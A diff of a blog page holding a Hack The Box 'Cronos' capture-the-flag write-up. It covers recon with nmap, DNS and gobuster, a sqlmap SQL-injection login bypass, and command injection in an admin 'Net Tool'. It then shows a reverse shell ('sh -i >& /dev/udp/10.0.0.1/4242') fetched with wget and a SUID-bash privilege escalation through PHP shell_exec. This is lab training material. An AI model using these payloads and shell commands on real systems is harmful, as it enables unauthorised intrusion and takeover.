@@ -34,7 +34,7 @@
         </header>
         <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
 <p>Let’s welcome Apache default paga again.</p>
-<p><img src="/_resources/087db3a1b36f4819b376b7ba90d9addb.png" /></p>
+<p><img src=":/087db3a1b36f4819b376b7ba90d9addb" alt="ebf37c8720911d99f0092b776902255b.png" /></p>
 <div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$nmap</span> -p- -A <span class="hljs-number">10.129</span>.<span class="hljs-number">194.97</span>
 Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-symbol">https:</span>//nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-number">-10</span><span class="hljs-number">-15</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">15</span> UTC
 Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">194.97</span>
@@ -84,7 +84,7 @@ ns1.cronos.htb.		604800	IN	A	10.10.10.13
 ;; WHEN: Tue Oct 15 10:29:00 UTC 2024
 ;; MSG SIZE  rcvd: 113</code></pre></div>
 <p>Adding <code>cronos.htb</code> as our ip (in my case 10.129.194.97) let’s us access a new site.</p>
-<p><img src="/_resources/1ea5a0e2c68148c3aa2ac06e1783d4ee.png" /></p>
+<p><img src=":/1ea5a0e2c68148c3aa2ac06e1783d4ee" alt="ba7da63fbac2eddc4a3f2bd53924186d.png" /></p>
 <p>Going to the “Documentation” redirect us to <a title="https://laravel.com/docs/11.x" href="https://laravel.com/docs/11.x">Laravel docs</a>, something deffinietly worth investigating later.“Laracasts” goes to <a title="https://laracasts.com/" href="https://laracasts.com/">Laracasts</a>, whatever that is. “News” goes to <a title="https://laravel-news.com/" href="https://laravel-news.com/">laravel-news</a>, [forge] goes to <a title="https://forge.laravel.com/" href="https://forge.laravel.com/">laravel forge</a> and github goes to <a title="https://github.com/laravel/laravel" href="https://github.com/laravel/laravel">laravel’s github</a>. Quite a lot of laravel if you ask me. Wappalyzer does not show it on this site, but running whatweb does (if the hint left by the author wasn’t enough). Let’s learn about it then.</p>
 <div><pre class="hljs"><code><span class="hljs-variable">$whatweb</span> http://www.cronos.htb/
 http://www.cronos.htb/ [200 OK] Apache[2.4.18], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[laravel_session], IP[10.129.194.97], Laravel, Title[Cronos], X-UA-Compatible[IE=edge]</code></pre></div>
@@ -107,22 +107,22 @@ Starting gobuster in VHOST enumeration mode
 Found: admin.cronos.htb Status: 200 [Size: 1547]
 Found: ADMIN.cronos.htb Status: 200 [Size: 1547]
 Found: Admin.cronos.htb Status: 200 [Size: 1547]</code></pre></div>
-<p><img src="/_resources/58abd81ddea44fda9a16328865ee6a66.png" /></p>
+<p><img src=":/58abd81ddea44fda9a16328865ee6a66" alt="79c57cb6b3eed16c3edc6abe6dc84eef.png" /></p>
 <p>That’s better. First let’s attack it with sqlmap, as it looks like a custom login page.</p>
 <div><pre class="hljs"><code>sqlmap -r tmp.req --level <span class="hljs-number">5</span> --risk <span class="hljs-number">3</span> --dump -v <span class="hljs-number">3</span>
 [<span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">40</span>] [PAYLOAD] -<span class="hljs-number">3434</span>' OR <span class="hljs-number">9239</span>=<span class="hljs-number">9239</span>-- rKXH
 got a 302 redirect to 'http:<span class="hljs-comment">//admin.cronos.htb/welcome.php'. Do you want to follow? [Y/n] </span></code></pre></div>
 <p>It works and we are greeted with Net Tool v 0.1.</p>
 <h1 id="net-tool-v01">Net Tool v0.1</h1>
-<p><img src="/_resources/95cb6594901a4b9da6772284d0036081.png" /></p>
+<p><img src=":/95cb6594901a4b9da6772284d0036081" alt="ad1dd0ea8867fda87bf2377ba49c164c.png" /></p>
 <p>Net Tool allows us to use ping and traceroute. Looking at the requests sent in burp, we can see that’s not the only thing we can use.</p>
-<p><img src="/_resources/2e2266f06ea2426492c112153aac59df.png" /></p>
+<p><img src=":/2e2266f06ea2426492c112153aac59df" alt="a8532562ef0b23d950ed160b858cc769.png" /></p>
 <p>Changing command to <code>ls</code> and host to <code>/</code> works.</p>
-<p><img src="/_resources/f3f180edbd0842a1b154828ed168726b.png" />.</p>
+<p><img src=":/f3f180edbd0842a1b154828ed168726b" alt="2d08036bf1a5d7dff5db3bb22768f244.png" />.</p>
 <p>Listing <code>/home</code> shows us folder <code>noulis</code>, but unfortunetly there is no .ssh folder. We have to create reverse shell then. I had some problems with executing <code>sh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1</code> this way, so I’ve created shell.sh file with it, run wget on the server, set up netcat and run the script. We are in.</p>
-<p><img src="/_resources/cdb693d257714d98b796368eff881116.png" /></p>
-<p><img src="/_resources/49e7160d8da54b3099422ec3c2450311.png" /></p>
-<p><img src="/_resources/bc5618c1788e4b50ba688c82f26e6f9e.png" /></p>
+<p><img src=":/cdb693d257714d98b796368eff881116" alt="c721e0f79cc4a59428319d43a70572b5.png" /></p>
+<p><img src=":/49e7160d8da54b3099422ec3c2450311" alt="5f7faa0e9f1e7cbe207b0e03a40a378e.png" /></p>
+<p><img src=":/bc5618c1788e4b50ba688c82f26e6f9e" alt="623286ac17430751c60d776571776d36.png" /></p>
 <p>Just standard shell stabilistaion at the end.</p>
 <div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
 <span class="hljs-built_in">export</span> <span class="hljs-attribute">TERM</span>=xterm
@@ -137,7 +137,7 @@ stty<span class="hljs-built_in"> raw </span>-echo; fg</code></pre></div>
 shell_exec(<span class="hljs-string">'chmod u+s /bin/bash'</span>);
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 <p>Then run <code>/bin/bash -p</code> and we are in. Nice and simple. We did’t use laravel though, somehow.</p>
-<p><img src="/_resources/ec8c13cb6ad6459095ed26445f46d692.png" /></p>
+<p><img src=":/ec8c13cb6ad6459095ed26445f46d692" alt="563c799e5465cfc7314b2fd2cc0bb16a.png" /></p>
 </div>
       </article>
     </div>
